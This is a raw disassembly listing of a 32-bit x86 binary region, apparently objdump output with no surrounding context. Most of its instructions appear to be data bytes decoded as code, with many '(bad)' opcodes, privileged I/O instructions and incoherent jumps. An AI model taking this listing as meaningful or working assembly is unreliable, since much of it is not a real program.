  42f9e8:	add    DWORD PTR [eax],eax
  42f9ea:	inc    DWORD PTR [eax]
  42f9ec:	add    BYTE PTR [eax],al
  42f9ee:	xlat   BYTE PTR ds:[ebx]
  42f9ef:	wbinvd 
  42f9f1:	ins    DWORD PTR es:[edi],dx
  42f9f2:	sti    
  42f9f3:	xchg   DWORD PTR [edx+ebp*4],edi
  42f9f6:	nop
  42f9f7:	mov    cl,0x15
  42f9f9:	stos   BYTE PTR es:[edi],al
  42f9fa:	xchg   ebp,eax
  42f9fb:	push   edx
  42f9fc:	mov    DWORD PTR [ecx+0x32],0x15ec1f6c
  42fa03:	mov    ebx,0x33c69a00
  42fa08:	xor    ebx,ebp
  42fa0a:	in     eax,dx
  42fa0b:	ret    0xdc0f
  42fa0e:	cmp    eax,0x26935bdf
  42fa13:	pop    edx
  42fa14:	dec    edi
  42fa15:	cmp    eax,0x135ea5d6
  42fa1a:	inc    edx
  42fa1b:	sub    al,BYTE PTR [edx]
  42fa1d:	sti    
  42fa1e:	mov    al,0xe0
  42fa20:	xchg   DWORD PTR [edi-0x33],ecx
  42fa23:	sbb    BYTE PTR [ebp+0x7147116b],dl
  42fa29:	(bad)  
  42fa2a:	out    0xd,al
  42fa2c:	xor    BYTE PTR ds:0x7acf2d4,bl
  42fa32:	jns    0x42fa78
  42fa34:	xor    ebx,DWORD PTR [ebp-0x5f]
  42fa37:	sub    BYTE PTR [ebx-0x51],ah
  42fa3a:	mov    ebx,0x3c596720
  42fa3f:	test   al,0x19
  42fa41:	push   0x32db61ec
  42fa46:	mov    dh,0x34
  42fa48:	pop    ebp
  42fa49:	mov    ebx,0xa9957f44
  42fa4e:	xchg   edi,eax
  42fa4f:	sbb    al,0xa2
  42fa51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fa52:	dec    esp
  42fa53:	inc    eax
  42fa54:	popf   
  42fa55:	dec    esi
  42fa56:	gs inc ebp
  42fa58:	stc    
  42fa59:	ja     0x42fa87
  42fa5b:	push   ss
  42fa5c:	aad    0xcd
  42fa5e:	int    0xb6
  42fa60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa61:	adc    eax,0xe2a2f612
  42fa66:	cs (bad) 
  42fa68:	retf   0x807e
  42fa6b:	(bad)  
  42fa6c:	xchg   esi,eax
  42fa6d:	int    0x77
  42fa6f:	xchg   al,bh
  42fa71:	pop    es
  42fa72:	test   eax,0xfd18ef2
  42fa77:	dec    esi
  42fa78:	jns    0x42fa56
  42fa7a:	hlt    
  42fa7b:	add    edi,edx
  42fa7d:	pop    esi
  42fa7e:	adc    al,0x12
  42fa80:	xchg   DWORD PTR [eax],esi
  42fa82:	out    dx,al
  42fa83:	into   
  42fa84:	jne    0x42fa74
  42fa86:	inc    eax
  42fa87:	xlat   BYTE PTR ds:[ebx]
  42fa88:	cs mov bl,0x53
  42fa8b:	xor    DWORD PTR [ebp-0x50001914],0x27
  42fa92:	xchg   esi,eax
  42fa93:	inc    eax
  42fa94:	inc    ebp
  42fa95:	dec    ebp
  42fa96:	jno    0x42fae9
  42fa98:	inc    ecx
  42fa99:	aam    0xad
  42fa9b:	and    al,0xcd
  42fa9d:	arpl   WORD PTR [ecx-0x19de354d],bp
  42faa3:	shl    esp,0x78
  42faa6:	stos   DWORD PTR es:[edi],eax
  42faa7:	jmp    0xc17368f
  42faac:	repnz imul esi,ebx,0xffffff83
  42fab0:	aad    0xcc
  42fab2:	shr    bh,cl
  42fab4:	jg     0x42fa38
  42fab6:	aam    0xab
  42fab8:	or     al,0xe8
  42faba:	jae    0x42fb39
  42fabc:	xor    cl,BYTE PTR [edx-0x4a]
  42fabf:	add    eax,0x9d4f65ae
  42fac4:	jns    0x42fb43
  42fac6:	scas   eax,DWORD PTR es:[edi]
  42fac7:	nop
  42fac8:	mov    bl,0xc0
  42faca:	(bad)  
  42facb:	repz popa 
  42facd:	and    DWORD PTR [eax],eax
  42facf:	hlt    
  42fad0:	retf   
  42fad1:	mov    eax,0x4c2d4324
  42fad6:	mov    ebp,edi
  42fad8:	xor    al,0xac
  42fada:	xchg   DWORD PTR [ebp+0x4fcc6b26],ecx
  42fae0:	sbb    edi,DWORD PTR [ecx+ebp*1-0xd]
  42fae4:	std    
  42fae5:	cmp    DWORD PTR [eax],0xffffffb1
  42fae8:	ss repnz xchg ebp,eax
  42faeb:	dec    esp
  42faec:	pop    esp
	...
  42fb55:	add    BYTE PTR [ebx],bl
  42fb57:	out    dx,eax
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	and    BYTE PTR [ebp+0x57],0xd4
  42fb66:	aas    
  42fb67:	inc    BYTE PTR [ecx]
  42fb69:	add    bh,bh
  42fb6b:	add    BYTE PTR [eax],al
  42fb6d:	add    BYTE PTR [edx+0x55],bl
  42fb70:	xchg   dh,ch
  42fb72:	xlat   BYTE PTR ds:[ebx]
  42fb73:	xor    BYTE PTR [esi+0x7e],al
  42fb76:	(bad)  
  42fb77:	pop    edi
  42fb78:	test   al,0x63
  42fb7a:	fld    QWORD PTR cs:[esi-0x337c047d]
  42fb81:	cmc    
  42fb82:	and    DWORD PTR ds:0x9dd2eb,ebp
  42fb88:	add    al,0xb7
  42fb8a:	gs loope 0x42fbe5
  42fb8d:	sbb    al,0x25
  42fb8f:	inc    eax
  42fb90:	mov    cl,0xb8
  42fb92:	(bad)  [edx]
  42fb94:	push   ss
  42fb95:	imul   esp,DWORD PTR [ebx+0x212c35dd],0xfffffffe
  42fb9c:	out    0x1c,eax
  42fb9e:	cmp    ebx,DWORD PTR [ecx]
  42fba0:	mov    esi,0xa0d33232
  42fba5:	inc    edx
  42fba6:	popf   
  42fba7:	xor    eax,0x917d8c
  42fbac:	loopne 0x42fc17
  42fbae:	out    dx,eax
  42fbaf:	mov    ebx,0xa8636720
  42fbb4:	(bad)  
  42fbb5:	and    al,0x10
  42fbb7:	jle    0x42fbfd
  42fbb9:	cmc    
  42fbba:	pop    es
  42fbbb:	jo     0x42fc10
  42fbbd:	(bad)  
  42fbbe:	xchg   edi,eax
  42fbbf:	aaa    
  42fbc0:	ds je  0x42fbf2
  42fbc3:	(bad)  
  42fbc5:	dec    eax
  42fbc6:	push   ds
  42fbc7:	jle    0x42fbb8
  42fbc9:	xchg   DWORD PTR [edx],ebx
  42fbcb:	in     al,dx
  42fbcc:	leave  
  42fbcd:	or     esi,ebp
  42fbcf:	or     al,0x85
  42fbd1:	test   eax,0x5e1f8667
  42fbd6:	fwait
  42fbd7:	jge    0x42fbf8
  42fbd9:	push   ebx
  42fbda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbdb:	out    0xea,al
  42fbdd:	shr    DWORD PTR [ecx+esi*1-0x6fee07a6],0xe7
  42fbe5:	imul   eax,DWORD PTR [esi],0x1c2de85d
  42fbeb:	inc    ebx
  42fbec:	int3   
  42fbed:	loopne 0x42fbbf
  42fbef:	mov    ds:0xa75b8c29,eax
  42fbf4:	mov    DWORD PTR [ebx],ebx
  42fbf6:	retf   
  42fbf7:	push   edx
  42fbf8:	aaa    
  42fbf9:	and    edx,0xf569c93d
  42fbff:	dec    esp
  42fc00:	stos   DWORD PTR es:[edi],eax
  42fc01:	mov    ecx,0x8f15393d
  42fc06:	sub    esi,ebx
  42fc08:	jno    0x42fbc8
  42fc0a:	mov    ebp,0x76018e3f
  42fc0f:	sub    dh,dh
  42fc11:	cmp    BYTE PTR [ebp+0x5a74dea7],dl
  42fc17:	repnz mov bh,0xb6
  42fc1a:	adc    al,0x4
  42fc1c:	push   ds
  42fc1d:	mov    ecx,esp
  42fc1f:	(bad)  
  42fc20:	out    0x90,al
  42fc22:	imul   DWORD PTR [ebx]
  42fc24:	js     0x42fbea
  42fc26:	test   BYTE PTR [edi-0x758053ab],ah
  42fc2c:	ja     0x42fc11
  42fc2e:	push   edi
  42fc2f:	jbe    0x42fc67
  42fc31:	fucompp 
  42fc33:	out    0x8b,eax
  42fc35:	and    ebx,DWORD PTR [ebx+edi*2-0x13]
  42fc39:	xor    eax,0xfa9eaf43
  42fc3e:	xor    al,bl
  42fc40:	jg     0x42fcac
  42fc42:	fild   WORD PTR [ebx-0x7218156a]
  42fc48:	sbb    eax,0xaa51221c
  42fc4d:	cli    
  42fc4e:	sub    cl,BYTE PTR [si]
  42fc51:	sbb    BYTE PTR [esi],0xaa
  42fc54:	aam    0x68
  42fc56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc57:	inc    ebp
  42fc58:	div    BYTE PTR [ebp-0x174a518b]
  42fc5e:	lock rcl DWORD PTR [eax-0x47510511],1
  42fc65:	mov    ebx,0xb8f70e2d
  42fc6a:	mov    esp,0xabb8
	...
  42fcd3:	add    BYTE PTR [eax],al
  42fcd5:	add    BYTE PTR [ebx],cl
  42fcd7:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fcdd:	call   0x7ec4:0x2036325e
  42fce4:	nop
  42fce5:	fdivr  DWORD PTR [esi]
  42fce7:	inc    DWORD PTR [ecx]
  42fce9:	add    bh,bh
  42fceb:	add    BYTE PTR [eax],al
  42fced:	add    BYTE PTR [ecx],ch
  42fcef:	popf   
  42fcf0:	cmp    ebp,DWORD PTR [ecx-0x5d]
  42fcf3:	pop    edi
  42fcf4:	sbb    dh,ah
  42fcf6:	(bad)  
  42fcf7:	sti    
  42fcf8:	int    0x10
  42fcfa:	inc    eax
  42fcfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fcfc:	cli    
  42fcfd:	call   0xd283d9ab
  42fd02:	(bad)
  42fd05:	adc    edi,DWORD PTR [ebp+0x6]
  42fd08:	and    DWORD PTR [ecx-0x68],0xd9f536d8
  42fd0f:	dec    eax
  42fd10:	push   edx
  42fd11:	fisubr WORD PTR [edx+0x7eb84cbb]
  42fd17:	inc    ebp
  42fd18:	cmp    al,0x67
  42fd1a:	xchg   ecx,eax
  42fd1b:	and    DWORD PTR [ebx-0x2bc5d6b],ebp
  42fd21:	adc    DWORD PTR [ebp+ecx*1+0x28bc4f7c],eax
  42fd28:	pop    ebx
  42fd29:	mov    ds:0x79b17782,al
  42fd2e:	imul   eax,DWORD PTR [ebp+0x72],0x431fb18d
  42fd35:	or     BYTE PTR [edi+0x2bf8e985],0x3a
  42fd3c:	sbb    cl,BYTE PTR [edx-0x56987dfc]
  42fd42:	mov    edi,0x3c940548
  42fd47:	ins    BYTE PTR es:[edi],dx
  42fd48:	adc    ebx,DWORD PTR [ecx+0x51fdb25e]
  42fd4e:	push   ecx
  42fd4f:	test   BYTE PTR [ebx-0x1],0x8d
  42fd53:	xchg   ebp,eax
  42fd54:	push   ss
  42fd55:	and    BYTE PTR ds:0x86a78b17,ah
  42fd5b:	inc    ebp
  42fd5c:	and    DWORD PTR es:[ebx-0x4e62f5e],eax
  42fd63:	inc    ebx
  42fd64:	out    dx,al
  42fd65:	stos   BYTE PTR es:[edi],al
  42fd66:	cmp    DWORD PTR [ecx+0x52],edx
  42fd69:	inc    edi
  42fd6a:	je     0x42fd8a
  42fd6c:	or     eax,0xf87211e4
  42fd71:	xor    BYTE PTR [ebx],al
  42fd73:	enter  0x4a5b,0xf9
  42fd77:	xlat   BYTE PTR ds:[ebx]
  42fd78:	cwde   
  42fd79:	aad    0x82
  42fd7b:	pusha  
  42fd7c:	inc    edx
  42fd7d:	daa    
  42fd7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd7f:	push   cs
  42fd80:	push   0x1f
  42fd82:	lods   eax,DWORD PTR ds:[esi]
  42fd83:	sbb    ebp,DWORD PTR [ecx+0x14]
  42fd86:	jno    0x42fd9c
  42fd88:	cmp    al,0x8a
  42fd8a:	inc    edi
  42fd8b:	mov    eax,ds:0x93cb2fb2
  42fd90:	(bad)  
  42fd91:	dec    edi
  42fd92:	mov    bl,0xb5
  42fd94:	dec    edi
  42fd95:	in     eax,0xfd
  42fd97:	mov    ecx,DWORD PTR [ecx+0x24]
  42fd9a:	adc    dh,BYTE PTR [eax-0x186b2dc4]
  42fda0:	sub    DWORD PTR [ebp-0x77a80eca],0xffffffe4
  42fda7:	(bad)  
  42fda8:	repnz popa 
  42fdaa:	test   BYTE PTR [ebp-0x56e068fa],bl
  42fdb0:	mov    ch,0x8b
  42fdb2:	leave  
  42fdb3:	repz xchg esp,eax
  42fdb5:	mov    ebx,0xaf54382e
  42fdba:	cs push ebx
  42fdbc:	loopne 0x42fd97
  42fdbe:	cmp    al,0x2d
  42fdc0:	push   esi
  42fdc1:	das    
  42fdc2:	test   BYTE PTR [esp+edx*1],ah
  42fdc5:	fstp   TBYTE PTR [edx-0x62]
  42fdc8:	pop    ss
  42fdc9:	test   al,0x9a
  42fdcb:	sahf   
  42fdcc:	(bad)  
  42fdcd:	jecxz  0x42fd73
  42fdcf:	popf   
  42fdd0:	adc    DWORD PTR [esi],esp
  42fdd2:	xchg   DWORD PTR [esi+0x41],eax
  42fdd5:	jae    0x42fd64
  42fdd7:	sti    
  42fdd8:	enter  0xa207,0x4b
  42fddc:	xor    ch,BYTE PTR [esi]
  42fdde:	or     al,0xb9
  42fde0:	mov    esp,0x12417c0b
  42fde5:	leave  
  42fde6:	aas    
  42fde7:	xor    al,BYTE PTR [edi+0xf69c39a]
	...
  42fe55:	add    BYTE PTR [eax-0x40],cl
  42fe58:	ret    0xcaf0
  42fe5b:	bnd jp 0x42fe56
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz test BYTE PTR [eax+0x4],bl
  42fe65:	sbb    DWORD PTR ds:0xff000200,edi
  42fe6b:	add    BYTE PTR [eax],al
  42fe6d:	add    BYTE PTR [edi-0x54881f5c],cl
  42fe73:	aas    
  42fe74:	xlat   BYTE PTR ds:[ebx]
  42fe75:	sub    ecx,eax
  42fe77:	mov    esp,0xd6bf41b3
  42fe7c:	in     eax,0x17
  42fe7e:	sahf   
  42fe7f:	inc    ebp
  42fe80:	neg    edx
  42fe82:	or     cl,ah
  42fe84:	mov    edi,0xdb1d463d
  42fe89:	cld    
  42fe8a:	in     al,0x8a
  42fe8c:	lea    ebx,ds:0xdc9192f1
  42fe92:	in     eax,dx
  42fe93:	mov    edi,0xa2661bc1
  42fe98:	jmp    0x2d88:0x3b4aee9f
  42fe9f:	aam    0xcc
  42fea1:	repz cdq 
  42fea3:	xchg   esi,eax
  42fea4:	dec    ecx
  42fea5:	add    dh,al
  42fea7:	mul    DWORD PTR [edx-0x400b6d52]
  42fead:	sti    
  42feae:	lock lds ebp,FWORD PTR [ecx+0x7e]
  42feb2:	in     al,dx
  42feb3:	and    DWORD PTR [eax-0x1c2f731a],edi
  42feb9:	mov    esi,0x1c6b6210
  42febe:	xchg   ebp,eax
  42febf:	in     eax,0xa5
  42fec1:	ins    BYTE PTR es:[edi],dx
  42fec2:	std    
  42fec3:	mov    edx,ebx
  42fec5:	sbb    al,0x4e
  42fec7:	rol    DWORD PTR [edi-0x2e1c5330],cl
  42fecd:	mov    al,ds:0x649cc317
  42fed2:	or     ebx,DWORD PTR [ecx]
  42fed4:	loopne 0x42ff49
  42fed6:	push   ebx
  42fed7:	jp     0x42feea
  42fed9:	cwde   
  42feda:	leave  
  42fedb:	hlt    
  42fedc:	jne    0x42fea8
  42fede:	mov    ebx,0xeefb3939
  42fee3:	pop    ebp
  42fee4:	test   al,0x37
  42fee6:	jmp    0xed0:0x92ba69c3
  42feed:	stc    
  42feee:	imul   ebp,DWORD PTR [edx],0x793d271f
  42fef4:	xor    DWORD PTR [esi+0x2b],ebx
  42fef7:	iret   
  42fef8:	inc    esp
  42fef9:	daa    
  42fefa:	leave  
  42fefb:	adc    eax,0x130ecea8
  42ff00:	dec    edx
  42ff01:	and    edi,eax
  42ff03:	mov    bl,BYTE PTR ds:0xcb591a4
  42ff09:	icebp  
  42ff0a:	xor    eax,0xa05b56a8
  42ff0f:	std    
  42ff10:	popa   
  42ff11:	(bad)  
  42ff12:	and    ecx,DWORD PTR [esi]
  42ff14:	adc    ebp,DWORD PTR [eax+0x4]
  42ff17:	out    dx,al
  42ff18:	xor    eax,0x93e160f2
  42ff1d:	lods   eax,DWORD PTR ds:[esi]
  42ff1e:	fldcw  WORD PTR [edx+0x50a9c40d]
  42ff25:	jnp    0x42fee5
  42ff27:	popf   
  42ff28:	pop    edx
  42ff29:	pop    esi
  42ff2a:	mov    bh,0xf1
  42ff2c:	adc    BYTE PTR es:0x6ef52237,0x50
  42ff34:	cwde   
  42ff35:	icebp  
  42ff36:	sbb    BYTE PTR [edx],al
  42ff38:	lock test al,0x1a
  42ff3b:	adc    bl,dl
  42ff3d:	adc    esi,DWORD PTR [edx]
  42ff3f:	sar    DWORD PTR [esi-0x58],1
  42ff42:	pop    ebp
  42ff43:	jnp    0x42ff9b
  42ff45:	inc    ecx
  42ff46:	push   edx
  42ff47:	mov    dl,0xc0
  42ff49:	push   0xffffffb5
  42ff4b:	mov    dl,0x37
  42ff4d:	adc    BYTE PTR [ebx-0x31d02f6b],al
  42ff53:	adc    DWORD PTR [ebx-0x79],ebx
  42ff56:	(bad)  
  42ff58:	stc    
  42ff59:	mov    DWORD PTR ss:[ecx+0x50],0x6d155b66
  42ff61:	push   esp
  42ff62:	sub    dl,dl
  42ff64:	dec    edi
  42ff65:	hlt    
  42ff66:	adc    eax,0x899185f1
  42ff6b:	out    dx,eax
  42ff6c:	pop    ds
	...
  42ffd5:	add    BYTE PTR [edi+eiz*2],al
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [edx+eiz*2-0x67],0x16
  42ffe5:	nop
  42ffe6:	cmp    al,0x1
  42ffe8:	add    al,BYTE PTR [eax]
  42ffea:	inc    DWORD PTR [eax]
  42ffec:	add    BYTE PTR [eax],al
  42ffee:	int3   
  42ffef:	arpl   WORD PTR [eax],dx
  42fff1:	mov    ch,0x58
  42fff3:	push   eax
  42fff4:	nop
  42fff5:	push   ecx
  42fff6:	fsub   DWORD PTR [ecx+0x15]
  42fff9:	add    al,0xa3
  42fffb:	and    BYTE PTR [edx],ah
  42fffd:	dec    ebx
  42fffe:	retf   0x9315
  430001:	imul   cx,si,0x37
  430005:	mov    ebx,0xa44f9d53
  43000a:	mov    ds:0x906968f2,eax
  43000f:	pop    ss
  430010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430011:	adc    eax,0xc06382bc
  430016:	jecxz  0x43007e
  430018:	shl    esi,cl
  43001a:	mov    edi,0x54efb8c6
  43001f:	call   0xcf0812cd
  430024:	mov    ebp,0x3db3a2b0
  430029:	adc    esi,DWORD PTR [edi-0x3b]
  43002c:	or     BYTE PTR [ecx-0x26861970],al
  430032:	fs pop eax
  430034:	or     al,0xa9
  430036:	gs and eax,0x22d3086a
  43003c:	cmp    ch,BYTE PTR [eax+0x70]
  43003f:	cdq    
  430040:	fimul  WORD PTR [ebp-0x76]
  430043:	data16 sbb cl,BYTE PTR [esi+ebx*4+0x36]
  430048:	outs   dx,DWORD PTR ds:[esi]
  430049:	sub    ecx,DWORD PTR [ebx+0x3f483818]
  43004f:	jno    0x4300b0
  430051:	inc    ebp
  430052:	stos   DWORD PTR es:[edi],eax
  430053:	mov    al,ds:0xe5605766
  430058:	inc    esi
  430059:	and    ebp,DWORD PTR [edx]
  43005b:	jge    0x430009
  43005d:	dec    eax
  43005e:	mov    BYTE PTR [ebp+0x6a34b895],ah
  430064:	xchg   edx,eax
  430065:	inc    esp
  430066:	jmp    0x42fffc
  430068:	jns    0x430071
  43006a:	stos   DWORD PTR es:[edi],eax
  43006b:	jbe    0x4300d3
  43006d:	jge    0x4300d0
  43006f:	dec    ebx
  430070:	in     al,dx
  430071:	inc    esp
  430072:	xchg   ecx,eax
  430073:	inc    ebp
  430074:	test   DWORD PTR [edi-0x895baa1],edx
  43007a:	push   ebx
  43007b:	or     DWORD PTR [edx+0x37],edi
  43007e:	jp     0x4300c8
  430080:	push   ebx
  430081:	xor    eax,0x899407
  430086:	sub    BYTE PTR [edi-0xb],dh
  430089:	(bad)  
  43008a:	cmc    
  43008b:	and    edi,DWORD PTR [ecx+0x421d4037]
  430091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430092:	ror    DWORD PTR [ebp+0x75],1
  430095:	push   ebp
  430096:	push   edx
  430097:	mov    esp,0x82a89c37
  43009c:	mov    di,0xae4d
  4300a0:	rsm    
  4300a2:	mov    al,0xf3
  4300a4:	dec    esi
  4300a5:	dec    edi
  4300a6:	pop    edx
  4300a7:	outs   dx,BYTE PTR ds:[esi]
  4300a8:	pop    esi
  4300a9:	leave  
  4300aa:	and    BYTE PTR [edx-0x3aa8d5a9],bl
  4300b0:	push   eax
  4300b1:	in     eax,dx
  4300b2:	add    DWORD PTR [esi+0x5426337d],esi
  4300b8:	(bad)  
  4300b9:	(bad)  
  4300ba:	data16 jge 0x4300e4
  4300bd:	mov    al,0x8f
  4300bf:	lock push ss
  4300c1:	mov    ch,0xed
  4300c3:	leave  
  4300c4:	cmp    al,0x82
  4300c6:	aaa    
  4300c7:	jno    0x4300b6
  4300c9:	push   ecx
  4300ca:	test   eax,0xdb102845
  4300cf:	mov    BYTE PTR [edx+0x5f3406d1],dh
  4300d5:	mov    ch,BYTE PTR [ebx-0x7]
  4300d8:	stos   DWORD PTR es:[edi],eax
  4300d9:	sub    DWORD PTR [eax-0x1c7e2d3b],ebp
  4300df:	mov    ecx,0x3d4f7976
  4300e4:	cmp    dh,BYTE PTR [esi+0x26]
  4300e7:	arpl   WORD PTR [edi+0x73],si
  4300ea:	bound  esp,QWORD PTR ds:0x34
	...
  430154:	add    BYTE PTR [eax],al
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0xba
  430163:	dec    esi
  430164:	dec    ebp
  430165:	sbb    edi,DWORD PTR [ebx]
  430167:	add    al,BYTE PTR [edx]
  430169:	add    BYTE PTR [eax+0x39000000],dl
  43016f:	sub    esi,DWORD PTR [esi+0x39]
  430172:	jno    0x430180
  430174:	pusha  
  430175:	mov    eax,ds:0x762cb322
  43017a:	jne    0x4301a2
  43017c:	adc    BYTE PTR [ebp+0xc],0xcf
  430180:	jp     0x430143
  430182:	sbb    BYTE PTR [ebx-0x3f],0x9c
  430186:	test   al,0xd7
  430188:	test   DWORD PTR [ecx-0x3b],ecx
  43018b:	sub    dh,BYTE PTR [ecx+0x45]
  43018e:	or     bh,BYTE PTR [ecx+ebx*1-0x63e23a21]
  430195:	add    BYTE PTR [esi-0x31],0xae
  430199:	pushf  
  43019a:	mov    ds:0xcf29aa64,eax
  43019f:	scas   eax,DWORD PTR es:[edi]
  4301a0:	xchg   ebp,eax
  4301a1:	je     0x430206
  4301a3:	loopne 0x4301e3
  4301a5:	xchg   edi,eax
  4301a6:	or     edx,DWORD PTR [edx]
  4301a8:	cmp    esi,edx
  4301aa:	jl     0x43018c
  4301ac:	inc    esp
  4301ad:	adc    al,BYTE PTR [edx-0x232bbbf8]
  4301b3:	sub    al,BYTE PTR [edx+0x71cfd69b]
  4301b9:	adc    BYTE PTR [edx+0x47],dl
  4301bc:	ins    BYTE PTR es:[edi],dx
  4301bd:	fdivrp st(1),st
  4301bf:	push   0xa4427458
  4301c4:	ror    al,0xea
  4301c7:	lock lea edx,[edx]
  4301ca:	retf   0x2f8e
  4301cd:	gs daa 
  4301cf:	push   ss
  4301d0:	pop    edi
  4301d1:	retf   0x153c
  4301d4:	(bad)  
  4301d5:	and    esp,edx
  4301d7:	js     0x430212
  4301d9:	jns    0x4301c4
  4301db:	addr16 mov al,ds:0xbcd7
  4301df:	test   ah,bl
  4301e1:	jnp    0x430204
  4301e3:	mov    bl,BYTE PTR [esi+0xdb264e3]
  4301e9:	xchg   ebx,eax
  4301ea:	add    DWORD PTR [edx],ebx
  4301ec:	jns    0x430236
  4301ee:	mov    dh,0xc0
  4301f0:	and    al,0xe5
  4301f2:	mov    eax,0xf7c3a9f
  4301f7:	retf   
  4301f8:	inc    ch
  4301fa:	in     eax,dx
  4301fb:	and    ch,BYTE PTR [edi+0xe5]
	...
  430255:	add    BYTE PTR [ebp+0x55],cl
  430258:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  43025e:	mov    esp,ebp
  430260:	or     al,ah
  430262:	dec    ebp
  430263:	add    bh,al
  430265:	add    BYTE PTR [eax],cl
  430267:	add    BYTE PTR [eax],al
  430269:	mov    DWORD PTR [eax],0x3ff44545
  43026f:	xor    DWORD PTR [eax],eax
  430271:	test   DWORD PTR [ebx-0x34070b64],ecx
  430277:	(bad)  
  430278:	enter  0x4d45,0xb8
  43027c:	mov    esi,DWORD PTR [edx]
  43027e:	hlt    
  43027f:	test   ebx,ecx
  430281:	pushf  
  430282:	enter  0x4df8,0x8b
  430286:	mov    DWORD PTR [ebp+0x8],0x894708
  43028d:	inc    ebp
  43028e:	mov    ebp,0xff8bfffc
  430293:	dec    ebp
  430294:	mov    ch,0xf4
  430296:	call   DWORD PTR [ebx-0x1]
  430299:	mov    ebx,0x8005426
  43029e:	call   DWORD PTR [ecx+0x8]
  4302a1:	pop    es
  4302a2:	jmp    0xb8:0x9cb4533
  4302a9:	fwait
  4302aa:	mov    esi,DWORD PTR [edx-0xc]
  4302ad:	xor    al,bl
  4302af:	add    BYTE PTR [ebx+0x3c83203],bl
  4302b5:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  4302bb:	mov    eax,DWORD PTR [ebx-0xb87b3]
  4302c1:	xor    eax,DWORD PTR [eax]
  4302c3:	retf   
  4302c4:	ret    
  4302c5:	add    eax,esi
  4302c7:	enter  0x8945,0x64
  4302cb:	dec    ebp
  4302cc:	sbb    ah,cl
  4302ce:	add    BYTE PTR [ebx-0xb87b277],cl
  4302d4:	dec    DWORD PTR [ebx-0xbcfb275]
  4302da:	test   DWORD PTR [ebx],esi
  4302dc:	dec    ebx
  4302de:	inc    DWORD PTR [ebx]
  4302e0:	inc    eax
  4302e1:	enter  0x8989,0x64
  4302e5:	(bad)  
  4302e6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4302ea:	cld    
  4302eb:	dec    DWORD PTR [ebp-0xa90001]
  4302f1:	push   edi
  4302f2:	mov    BYTE PTR [edx+0x1],ch
  4302f5:	and    DWORD PTR [eax],eax
  4302f7:	pop    ecx
  4302f8:	inc    ebp
  4302f9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4302ff:	push   0xffffff89
  430301:	pop    ecx
  430302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430303:	dec    ebp
  430304:	add    BYTE PTR [ecx+0x45fc088b],cl
  43030a:	jne    0x430355
  43030c:	lea    eax,[eax]
  43030e:	fs (bad) 
  430310:	dec    DWORD PTR [eax]
  430312:	mov    DWORD PTR [eax],eax
  430314:	test   al,0x0
  430316:	add    BYTE PTR [ebp-0x18],cl
  430319:	xor    ebp,DWORD PTR [edx]
  43031b:	add    eax,DWORD PTR [eax]
  43031d:	mov    eax,eax
  43031f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430326:	inc    ebp
  430327:	mov    DWORD PTR [ebx+0x459408],ecx
  43032d:	bound  ecx,QWORD PTR [ebx-0x372749b]
  430333:	inc    eax
  430334:	cmp    bh,0x1
  430337:	lea    eax,[eax]
  430339:	and    BYTE PTR [eax],al
  43033b:	inc    DWORD PTR [ecx-0x18]
  43033e:	mov    ecx,DWORD PTR [ebx]
  430340:	cld    
  430341:	add    BYTE PTR [ecx+0x75014d],cl
  430347:	(bad)  
  430348:	xchg   ebp,eax
  430349:	sar    bh,1
  43034b:	inc    eax
  43034c:	inc    DWORD PTR [eax]
  43034e:	mov    eax,DWORD PTR [ebp-0x4]
  430351:	xor    edx,DWORD PTR [edx+0x7201be]
  430357:	add    BYTE PTR [edx],dl
  430359:	(bad)  
  43035a:	nop
  43035b:	inc    ebp
  43035c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430362:	mov    al,0xff
  430364:	add    bh,bh
  430366:	add    BYTE PTR [ebx],dh
  430368:	inc    DWORD PTR [ebx]
  43036a:	sbb    al,0x89
  43036c:	jne    0x43034a
  43036e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430374:	mov    eax,DWORD PTR [ebp-0xff0048]
  43037a:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430381:	inc    DWORD PTR [ebp-0x75]
  430384:	fisttp QWORD PTR [esi+ebp*8]
  430387:	test   DWORD PTR [esi-0x1],esp
  43038a:	inc    ebp
  43038b:	(bad)  
  43038c:	aas    
  43038d:	inc    ebp
  43038e:	(bad)  
  43038f:	lea    edi,[eax+edi*2-0x1]
  430393:	inc    edi
  430395:	mov    DWORD PTR ds:0x8000c7a0,edi
  43039b:	mov    ebp,esp
  43039d:	cld    
  43039e:	loop   0x43032d
  4303a0:	inc    ebp
  4303a1:	(bad)  
  4303a2:	out    dx,al
  4303a3:	(bad)  
  4303a4:	fisttp WORD PTR [eax+0x8801c7]
  4303aa:	jecxz  0x4303f1
  4303ac:	in     al,dx
  4303ad:	inc    DWORD PTR [ebp-0x4]
  4303b0:	out    0x8d,eax
  4303b2:	aas    
  4303b3:	(bad)  
  4303b4:	call   0xcb2eb8
  4303b9:	add    DWORD PTR [ebx-0x7f490400],ecx
  4303bf:	add    BYTE PTR [ecx],al
